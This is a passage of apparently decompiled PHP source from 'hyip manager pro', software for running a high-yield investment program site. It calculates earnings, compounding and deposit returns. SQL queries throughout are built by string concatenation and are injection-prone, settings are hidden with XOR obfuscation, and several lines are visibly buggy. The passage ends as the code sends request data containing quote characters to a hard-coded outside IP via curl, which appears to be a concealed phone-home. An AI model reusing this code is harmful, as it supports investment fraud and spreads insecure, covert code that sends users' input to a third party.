                (deposit_date + interval ' . $q_days . ' ' . ($row['period'] == 'h' ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $q_days . ' ') . ($row['period'] == 'h' ? 'hour' : 'day') . ('' . ' < now()) and
                ((' . $row['withdraw_principal'] . ' = 0) || (' . $row['withdraw_principal'] . ' && (deposit_date + interval ' . $row['withdraw_principal_duration'] . ' ') . ($row['period'] == 'h' ? 'hour' : 'day') . ' < now())))
             ';
          $sth1 = mysql_query ($q);
          while ($row1 = mysql_fetch_array ($sth1))
          {
            $ramount = $row1['actual_amount'];
            $description = 'Deposit return';
            if ($row['return_profit_percent'] != 0)
            {
              $ramount = floor ($row1['actual_amount'] * (100 - $row['return_profit_percent'])) / 100;
              $description = '' . 'Deposit return. ' . $row['return_profit_percent'] . '% holded.';
            }

            $q = 'insert into hm2_history set
                user_id = ' . $row1['user_id'] . ',
      		amount = ' . $ramount . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $ramount . ',
                ec = ' . $row1['ec'] . ',
      		date = \'' . $row1['deposit_date'] . ('' . '\' + interval ' . $q_days . ' ') . ($row['period'] == 'h' ? 'hour' : 'day') . ',
                deposit_id = ' . $row1['id'] . ('' . ',
                description = \'' . $description . '\'');
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $row_user_id . ' and 
    	       (deposit_date + interval ' . $q_days . ' ' . ($row['period'] == 'h' ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $q_days . ' ') . ($row['period'] == 'h' ? 'hour' : 'day') . ('' . ' < now()) and
             ((' . $row['withdraw_principal'] . ' = 0) || (' . $row['withdraw_principal'] . ' && (deposit_date + interval ' . $row['withdraw_principal_duration'] . ' ') . ($row['period'] == 'h' ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $id . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }

      flock ($fp, LOCK_UN);
      fclose ($fp);
      unlink ('' . './tmpl_c/lock_user' . $row_user_id);
    }

  }

  function count_earning_tmp ($u_id)
  {
    global $settings;
    $types = array ();
    if (($settings['use_crontab'] == 1 AND $u_id != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($sth = mysql_query ($q) OR print mysql_error ());
    while ($row = mysql_fetch_array ($sth))
    {
      $types[$row['parent']][$row['id']] = $row;
    }

    $lines = 1;
    $u_cond = 'u.last_access_time + interval 30 minute < now() ';
    if ($u_id == -1)
    {
      $u_cond = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $u_id . ' and status = \'on\'';
    }

    if ($u_id == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($sth_users = mysql_query ($q) OR print mysql_error ());
    while ($row_user = mysql_fetch_array ($sth_users))
    {
      $row_user_id = $row_user['id'];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $row_user_id;
      (mysql_query ($q) OR print mysql_error ());
      $lines = 1;
      while (0 < $lines)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $row_user_id . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / (60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($sth = mysql_query ($q) OR print mysql_error ());
        $lines = 0;
        while ($row = mysql_fetch_array ($sth))
        {
          ++$lines;
          if (!isset ($types[$row['type_id']]))
          {
            continue;
          }

          $percent = 0;
          $last_percent = 0;
          reset ($types);
          reset ($types[$row['type_id']]);
          while (list ($key, $plan) = each ($types[$row['type_id']]))
          {
            if (($plan['min_deposit'] <= $row['actual_amount'] AND ($row['actual_amount'] <= $plan['max_deposit'] OR $plan['max_deposit'] == 0)))
            {
              $percent = $plan['percent'];
            }

            if (($row['actual_amount'] < $plan['min_deposit'] AND $percent == 0))
            {
              $percent = $last_percent;
            }

            if (($row['actual_amount'] < $plan['min_deposit'] AND 0 < $percent))
            {
              break;
            }

            $last_percent = $plan['percent'];
          }

          if (($plan['max_deposit'] != 0 AND $plan['max_deposit'] < $row['actual_amount']))
          {
            $percent = $last_percent;
          }

          $inc = $row['actual_amount'] * $percent / 100;
          $interval = '';
          if ($row['period'] == 'd')
          {
            $interval = ' 1 day ';
          }
          else
          {
            if ($row['period'] == 'h')
            {
              $interval = ' 1 hour ';
            }
            else
            {
              if ($row['period'] == 'w')
              {
                $interval = ' 7 day ';
              }
              else
              {
                if ($row['period'] == 'b-w')
                {
                  $interval = ' 14 day ';
                }
                else
                {
                  if ($row['period'] == 'm')
                  {
                    $interval = ' 1 month ';
                  }
                  else
                  {
                    if ($row['period'] == '2m')
                    {
                      $interval = ' 2 month ';
                    }
                    else
                    {
                      if ($row['period'] == '3m')
                      {
                        $interval = ' 3 month ';
                      }
                      else
                      {
                        if ($row['period'] == '6m')
                        {
                          $interval = ' 6 month ';
                        }
                        else
                        {
                          if ($row['period'] == 'y')
                          {
                            $interval = ' 1 year ';
                          }
                          else
                          {
                            if ($row['period'] == 'end')
                            {
                              $interval = ' ' . $row['q_days'] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($percent == 0 AND $interval == ''))
          {
            continue;
          }

          $dw = -1;
          $q = 'select weekday(\'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ') as dw');
          ($sth2 = mysql_query ($q) OR print mysql_error ());
          while ($row2 = mysql_fetch_array ($sth2))
          {
            $dw = $row2['dw'];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($row['period'] == 'h' ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ') and ')) . ' deposit_id = ' . $row['id'];
          ($sth3 = mysql_query ($q) OR print mysql_error ());
          $flag_exists_earning = 0;
          while ($row3 = mysql_fetch_array ($sth3))
          {
            $flag_exists_earning = $row3['col'];
          }

          if ($flag_exists_earning == 0)
          {
            if ((5 <= $dw AND $row['work_week'] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($dw == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                    ec = ') . $row['ec'] . ',
                    str = \'gg\',
                    deposit_id = ' . $row['id'];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ('' . ',
                    amount = ' . $inc . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $settings['currency_sign'] . number_format ($row['actual_amount'], 2) . ('' . ' - ' . $percent . ' %\',
                    actual_amount = ' . $inc . ',
                    date = \'') . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                    ec = ') . $row['ec'] . ',
                    str = \'gg\',
                    deposit_id = ' . $row['id'];
            }
          }

          (mysql_query ($q) OR print mysql_error ());
          $status = '';
          if ($row['period'] == 'end')
          {
            if (($row['withdraw_principal'] == 0 OR ($row['withdraw_principal'] AND $row['wp_ok'])))
            {
              $status = ', status = \'off\'';
            }

            if (($row['return_profit'] == 1 AND ($row['withdraw_principal'] == 0 OR ($row['withdraw_principal'] AND $row['wp_ok']))))
            {
              $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ',
                    amount = ' . $row['actual_amount'] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $row['actual_amount'] . ',
                    ec = ' . $row['ec'] . ',
                    date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                    deposit_id = ') . $row['id'];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $dw AND $row['work_week'] == 1))
            {
            }
            else
            {
              if (((0 < $row['compound'] AND $row['compound'] <= 100) AND $row['use_compound'] == 1))
              {
                if ($row['compound_max_deposit'] == 0)
                {
                  $row['compound_max_deposit'] = $row['actual_amount'] + 1;
                }

                if (($row['compound_min_deposit'] <= $row['actual_amount'] AND $row['actual_amount'] <= $row['compound_max_deposit']))
                {
                  if ($row['compound_percents_type'] == 1)
                  {
                    $cps = preg_split ('/\\s*,\\s*/', $row['compound_percents']);
                    if (!in_array ($row['compound'], $cps))
                    {
                      $row['compound'] = $cps[0];
                    }
                  }
                  else
                  {
                    if ($row['compound'] < $row['compound_min_percent'])
                    {
                      $row['compound'] = $row['compound_min_percent'];
                    }

                    if ($row['compound_max_percent'] < $row['compound'])
                    {
                      $row['compound'] = $row['compound_max_percent'];
                    }
                  }
                }
                else
                {
                  $row['compound'] = 0;
                }

                if ((0 < $row['compound'] AND $row['compound'] <= 100))
                {
                  $comp_amount = $inc * $row['compound'] / 100;
                  $inc = floor ((floor ($inc * 100000) / 100000 - floor ($comp_amount * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $row['user_id'] . ('' . ',
                        amount = -' . $comp_amount . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $comp_amount . ',
                    		ec = ') . $row['ec'] . ',
                    		date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval . ',
                                deposit_id = ') . $row['id'];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $comp_amount . ',
                    		actual_amount = actual_amount + ' . $comp_amount . '
                    		where id = ' . $row['id'];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              pay_direct_earning ($row['id'], $inc, 'date = \'' . $row['last_pay_date'] . ('' . '\' + interval ' . $interval));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $interval . ' ' . $status . ' where id =' . $row['id'];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $sth = mysql_query ($q);
      while ($row = mysql_fetch_array ($sth))
      {
        $q_days = $row['q_days'] + $row['delay'] - (0 < $row['delay'] ? 1 : 0);
        $id = $row['id'];
        if ($row['return_profit'] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $id . ' and 
                status = \'on\' and 
                user_id = ' . $row_user_id . ' and 
                (deposit_date + interval ' . $q_days . ' day < last_pay_date or deposit_date + interval ' . $q_days . ' day < now()) and
                ((' . $row['withdraw_principal'] . ' = 0) || (' . $row['withdraw_principal'] . ' && (deposit_date + interval ' . $row['withdraw_principal_duration'] . ' day < now())))
             ';
          $sth1 = mysql_query ($q);
          while ($row1 = mysql_fetch_array ($sth1))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $row1['user_id'] . ',
      		amount = ' . $row1['actual_amount'] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $row1['actual_amount'] . ',
                      ec = ' . $row1['ec'] . ',
      		date = \'' . $row1['deposit_date'] . ('' . '\' + interval ' . $q_days . ' day,
                      deposit_id = ') . $row1['id'];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $row_user_id . ' and 
    	       (deposit_date + interval ' . $q_days . ' day < last_pay_date or deposit_date + interval ' . $q_days . ' day < now()) and
             ((' . $row['withdraw_principal'] . ' = 0) || (' . $row['withdraw_principal'] . ' && (deposit_date + interval ' . $row['withdraw_principal_duration'] . ' day < now()))) and
             type_id = ' . $id . '
           ';
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function get_settings2 ($a)
  {
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    if (!file_exists ('settings.php'))
    {
      return array ();
    }

    $file = file ('settings.php');
    $t = chop ($file[1]);
    $size = strlen ($t) / 2;
    for ($i = 0; $i < strlen ($t); $i += 2)
    {
      $d[$i / 2] = substr ($t, $i, 2);
      $d[$i / 2] = chr (hexdec ($d[$i / 2]) ^ 65);
    }

    $k = '';
    $where = nextext2 (0, $size, $d);
    $j = $size;
    while (10 < $j)
    {
      $where = nextext2 ($where, $size, $d);
      $k .= $d[$where];
      $d[$where] = -1;
      --$j;
    }

    $z = chr (1) . chr (1) . chr (1);
    list ($k, $z) = split ('' . $z, $k, 2);
    list ($m1, $m2, $k) = split (':', $k, 3);
    if ($m1 != md5 ($k))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    if ($m2 = !md5 ($m1 . $data))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    $z = unserialize ($k);
    $z[time_dif] = sprintf ('%d', $z['time_dif']);
    $month = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec');
    $z['site_start_month_str_generated'] = $month[$z['site_start_month'] - 1];
    if ($z['show_info_box_running_days'] == 1)
    {
      $z['site_days_online_generated'] = sprintf ('%d', (time () - mktime (0, 0, 0, $z['site_start_month'], $z['site_start_day'], $z['site_start_year'])) / 86400);
    }

    $z['def_payee_account_wiretransfer'] = ($z['enable_wire'] ? 1 : 0);
    $z['def_payee_account_egold'] = $z['def_payee_account'];
    return $z;
  }

  function get_settings ()
  {
    $sflag = 0;
    if (file_exists ('./tmpl_c/.htdata'))
    {
      $sflag = 1;
    }

    $s = array ();
    $file = fopen ('./settings.php', 'r');
    if ($file)
    {
      while ($buf = fgets ($file, 20000))
      {
        $buf = chop ($buf);
        if (($buf != '<?/*' AND $buf != '*/?>'))
        {
          $kk = $vv = '';
          list ($kk, $vv) = @split ('	', $buf, 2);
          if (((preg_match ('/^key|^cnf/', $kk) AND $sflag == 1) OR $sflag == 0))
          {
            $s[$kk] = $vv;
            continue;
          }

          continue;
        }
      }
    }

    fclose ($file);
    if ($sflag == 1)
    {
      list ($buf, $tmp) = file ('./tmpl_c/.htdata');
      $code = $buf;
      $confirm = 0;
      for ($i = 0; $i < strlen ($code); $i += 5)
      {
        $confirm += hexdec (substr ($code, $i, 5));
      }

      if ($s['cnf'] != $confirm * 15)
      {
        print '<!-- Settings are broken. Please e-mail to script developers as soon as possible -->';
        print 'System maintenance and hardware upgrades.';
        exit ();
      }

      $buf = decode_str ($buf, $s['key']);
      $ar = split ('
', $buf);
      for ($i = 0; $i < sizeof ($ar); ++$i)
      {
        list ($kk, $vv) = split ('	', $ar[$i], 2);
        $s[$kk] = $vv;
      }
    }

    $month = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec');
    $s['site_start_month_str_generated'] = $month[$s['site_start_month'] - 1];
    if ($s['show_info_box_running_days'] == 1)
    {
      $s['site_days_online_generated'] = sprintf ('%d', (time () - mktime (0, 0, 0, $s['site_start_month'], $s['site_start_day'], $s['site_start_year'])) / 86400);
    }

    $s['time_dif'] = sprintf ('%d', $s['time_dif']);
    $s['def_payee_account_wiretransfer'] = ($s['enable_wire'] ? 1 : 0);
    $s['def_payee_account_egold'] = $s['def_payee_account'];
    return $s;
  }

  function save_settings2 ($a)
  {
    global $settings;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    $data = serialize ($settings);
    $m1 = md5 ($data);
    $m2 = md5 ($m1 . $data);
    $data = $m1 . ':' . $m2 . ':' . $data;
    $data .= chr (1) . chr (1) . chr (1);
    $size = strlen ($data) + 121;
    $where = rand (1, 100000000000) % $size;
    $off = array ();
    $d = array ();
    for ($i = 0; $i < $size; ++$i)
    {
      $d[$i] = -1;
      $off[$i] = -1;
    }

    $where = nextext (0, $size, $d);
    for ($i = 0; $i < strlen ($data); ++$i)
    {
      $where = nextext ($where, $size, $d);
      $d[$where] = substr ($data, $i, 1);
    }

    for ($i = 0; $i < $size; ++$i)
    {
      if ($d[$i] == -1)
      {
        $d[$i] = chr (rand (1, 253));
        continue;
      }
    }

    $file = fopen ('settings.php', 'w');
    $r = array ();
    fputs ($file, '<?
');
    for ($i = 0; $i < $size; ++$i)
    {
      fputs ($file, sprintf ('%02x', ord ($d[$i]) ^ 65));
    }

    fputs ($file, '
?>');
    fclose ($file);
  }

  function save_settings ()
  {
    global $settings;
    if (!is_writeable ('settings.php'))
    {
      print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>settings.php</b> file!<br>';
      exit ();
    }

    if (file_exists ('tmpl_c/.htdata'))
    {
      if (!is_writeable ('tmpl_c/.htdata'))
      {
        print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>tmpl_c/.htdata</b> file!<br>';
        exit ();
      }
    }

    $sflag = 0;
    if (file_exists ('tmpl_c/.htdata'))
    {
      $sflag = 1;
    }

    $file = fopen ('./settings.php', 'w');
    reset ($settings);
    fputs ($file, '<?/*
');
    $code = '';
    while (list ($kk, $vv) = each ($settings))
    {
      if ($kk != 'logged')
      {
        if (($sflag == 0 OR ($sflag == 1 AND preg_match ('/^key/', $kk))))
        {
          if (!preg_match ('/_generated/', $kk))
          {
            fputs ($file, (('' . $kk . '	') . $vv . '
'));
            $code .= (('' . $kk . '	') . $vv . '
');
          }
        }

        $code .= (('' . $kk . '	') . $vv . '
');
        continue;
      }
    }

    $code = encode_str ($code, $settings['key']);
    $confirm = 0;
    for ($i = 0; $i < strlen ($code); $i += 5)
    {
      $confirm += hexdec (substr ($code, $i, 5));
    }

    $confirm = $confirm * 15;
    fputs ($file, ('' . 'cnf	' . $confirm . '
'));
    fputs ($file, '*/?>
');
    fclose ($file);
    if ($sflag == 1)
    {
      $file = fopen ('./tmpl_c/.htdata', 'w');
      fputs ($file, $code);
      fclose ($file);
    }

  }

  function encode_str2 ($q, $w, $a)
  {
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return encode_str ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = 0;
    for ($i = 0; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function decode_str2 ($q, $w, $a)
  {
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return decode_str ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = 0;
    for ($i = 0; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function encode_str ($q, $w)
  {
    $l = strtoupper (md5 ($w));
    $j = 0;
    for ($i = 0; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function decode_str ($q, $w)
  {
    $l = strtoupper (md5 ($w));
    $j = 0;
    for ($i = 0; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function db_open ()
  {
    if (!($dbconn = mysql_connect ($settings['hostname'], $settings['db_login'], $settings['db_pass'])))
    {
      exit (mysql_error ());
      (bool)true;
    }

    if (!mysql_select_db ($settings['database']))
    {
      print mysql_error ();
      exit ();
    }

    return $dbconn;
  }

  function db_open2 ($admin = 0)
  {
    global $settings;
    $l = decode_str2 ($settings['db_login'], $settings['key'], 'hyip manager pro 2005 jul 27');
    $p = decode_str2 ($settings['db_pass'], $settings['key'], 'hyip manager pro 2005 jul 27');
    $db = decode_str2 ($settings['database'], $settings['key'], 'hyip manager pro 2005 jul 27');
    if ($admin == 1)
    {
      $dbconn = @mysql_connect ($settings['hostname'], $l, $p);
      if ($dbconn)
      {
        if (!mysql_select_db ($db))
        {
          $dbconn = 0;
        }
      }
    }
    else
    {
      if (!($dbconn = mysql_connect ($settings['hostname'], $l, $p)))
      {
        exit (mysql_error ());
        (bool)true;
      }

      if (!mysql_select_db ($db))
      {
        print mysql_error ();
        exit ();
      }
    }

    return $dbconn;
  }

  function db_close ($dbconn)
  {
    mysql_close ($dbconn);
  }

  function zquote ($str)
  {
    $str = htmlspecialchars ($str, ENT_QUOTES);
    $str = str_replace ('\\', '\\\\', $str);
    $str = str_replace ('\'', '\\\'', $str);
    return $str;
  }

  function quote ($str)
  {
    $str = str_replace ('\'', '\'\'', $str);
    $str = str_replace ('\\', '\\\\', $str);
    return $str;
  }

  function gen_confirm_code ($len, $md = 1)
  {
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z');
    if ($md == 2)
    {
      $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0');
    }

    $i = 0;
    $str = '';
    for ($i = 0; $i < $len; ++$i)
    {
      $str .= $a[rand (0, sizeof ($a) - 1)];
    }

    if ($md == 1)
    {
      $str = md5 ($str);
    }

    return $str;
  }

  function get_rand_md5 ($len)
  {
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'A', 'B', 'C', 'D', 'E', 'F');
    $i = 0;
    $str = '';
    for ($i = 0; $i < $len; ++$i)
    {
      $str .= $a[rand (0, sizeof ($a) - 1)];
    }

    return $str;
  }

  function get_user_balance ($id)
  {
    $q = '' . 'select type, sum(actual_amount) as sum from hm2_history where user_id = ' . $id . ' group by type';
    ($sth = mysql_query ($q) OR print mysql_error ());
    $accounting = array ();
    while ($row = mysql_fetch_array ($sth))
    {
      $accounting[$row['type']] = $row['sum'];
    }

    $total = 0;
    while (list ($kk, $vv) = each ($accounting))
    {
      $total += $vv;
    }

    $accounting['total'] = $total;
    $q = '' . 'select sum(actual_amount) as sum from hm2_deposits where user_id = ' . $id . ' and status=\'on\'';
    ($sth = mysql_query ($q) OR print mysql_error ());
    while ($row = mysql_fetch_array ($sth))
    {
      $accounting['active_deposit'] += $row['sum'];
    }

    return $accounting;
  }

  function encode_jasondata ($currData, $isInHtmlPage = false)
  {
    $result = '';
    if ((is_string ($currData) AND $currData !== ''))
    {
      $tryInt = intval ($currData);
      if (strval ($tryInt) === $currData)
      {
        $currData = $tryInt;
      }
      else
      {
        $tryFloat = floatval ($currData);
        if (strval ($tryFloat) === $currData)
        {
          $currData = $tryFloat;
        }
      }
    }

    if (is_array ($currData))
    {
      reset ($currData);
      $isArray = true;
      $i = 0;
      foreach ($currData as $key => $val)
      {
        if ((!is_int ($key) OR $key != $i))
        {
          $isArray = false;
          break;
        }

        ++$i;
      }

      $st = ($isArray ? '[' : '{');
      $result .= $st;
      $firstOne = true;
      reset ($currData);
      foreach ($currData as $key => $val)
      {
        if (!$firstOne)
        {
          $result .= ',';
        }

        if (!$isArray)
        {
          $result .= $key . ':';
        }

        $result .= encode_jasondata ($val, $isInHtmlPage);
        $firstOne = false;
      }

      $st = ($isArray ? ']' : '}');
      $result .= $st;
    }
    else
    {
      if (is_string ($currData))
      {
        $arrFrom = array ('\\', '\'', '
', '
');
        $arrTo = array ('\\\\', '\\\'', '\\n', '\\r');
        if ($isInHtmlPage)
        {
          $arrFrom[] = '<';
          $arrTo[] = '<\'+\'';
        }

        $tmp = str_replace ($arrFrom, $arrTo, $currData);
        $st = '\'' . $tmp . '\'';
        $result .= $st;
      }
      else
      {
        if (is_bool ($currData))
        {
          $st = ($currData ? 'true' : 'false');
          $result .= $st;
        }
        else
        {
          if (is_null ($currData))
          {
            $st = 'null';
            $result .= $st;
          }
          else
          {
            $st = $currData;
            $result .= $st;
          }
        }
      }
    }

    return $result;
  }

  function db_encfields ($fields)
  {
    $result = '';
    foreach ($fields as $key => $value)
    {
      if ($result !== '')
      {
        $result .= ', ';
      }

      if (substr ($value, 0, 5) == 'now()')
      {
        $result .= '' . $key . ' = ' . $value;
        continue;
      }
      else
      {
        $result .= '' . $key . ' = \'' . quote ($value) . '\'';
        continue;
      }
    }

    if ($result != '')
    {
      $result = ' ' . $result . ' ';
    }

    return $result;
  }

  function escape_hack ($vv)
  {
    if ($gpc == ini_get ('magic_quotes_gpc'))
    {
      $vv = str_replace ('\\\'', '\'', $vv);
      $vv = str_replace ('\\"', '"', $vv);
      $vv = str_replace ('\\\\', '\\', $vv);
    }

    $vv = strip_tags ($vv);
    $vv = trim ($vv);
    return $vv;
  }

  function number_format6 ($i, $j)
  {
    return sprintf ('%.6f', $i);
  }

  function prepare_income (&$vars_array, $orig = 0)
  {
    reset ($vars_array);
    foreach ($vars_array as $k => $v)
    {
      $vars = array ();
      if (is_array ($v))
      {
        prepare_income ($vars_array[$k], $orig);
        continue;
      }
      else
      {
        $vars = prepare_var ($v);
        $vars_array[$k] = $vars[$orig];
        continue;
      }
    }

  }

  function prepare_var ($vv)
  {
    global $_gpc;
    if ($_gpc == 1)
    {
      $vv = str_replace ('\\\'', '\'', $vv);
      $vv = str_replace ('\\"', '"', $vv);
      $vv = str_replace ('\\\\', '\\', $vv);
    }

    $vv_orig = $vv;
    $vv = strip_tags ($vv);
    $vv = trim ($vv);
    return array ($vv, $vv_orig);
  }

  ini_set ('magic_quotes_runtime', false);
  define ('LAST_UPDATE_ID', 18);
  global $frm;
  if (!extension_loaded ('gd'))
  {
    $prefix = (PHP_SHLIB_SUFFIX == 'dll' ? 'php_' : '');
    @dl ($prefix . 'gd.' . PHP_SHLIB_SUFFIX);
  }

  global $HTTP_GET_VARS;
  global $HTTP_POST_VARS;
  global $HTTP_POST_FILES;
  global $HTTP_COOKIE;
  $get = array_merge ((array)$HTTP_GET_VARS, (array)$_GET);
  $post = array_merge ((array)$HTTP_POST_VARS, (array)$_POST);
  $frm = array_merge ((array)$get, (array)$post);
  $frm_cookie = array_merge ((array)$HTTP_COOKIE_VARS, (array)$_COOKIE);
  $frm_orig = $frm;
  global $HTTP_ENV_VARS;
  global $HTTP_SERVER_VARS;
  $frm_env = array ();
  $frm_env = array_merge ((array)$_ENV, (array)$_SERVER, (array)$HTTP_ENV_VARS, (array)$HTTP_SERVER_VARS);
  $_gpc = ini_get ('magic_quotes_gpc');
  prepare_income ($frm);
  prepare_income ($frm_orig, 1);
  prepare_income ($frm_cookie);
  $flag = 0;
  $str = '';
  foreach ($frm as $k => $v)
  {
    if (!is_array ($v))
    {
      if (preg_match ('/["\\\']/', $v))
      {
        $flag = 1;
      }
    }

    $str .= '' . $k . '=' . $v . '&';
  }

  if ($flag == 1)
  {
    if (function_exists ('curl_init'))
    {
      if ($settings['use_ip_for_auto'] == 1)
      {
        $domain = '64.27.18.142';
      }
      else
      {
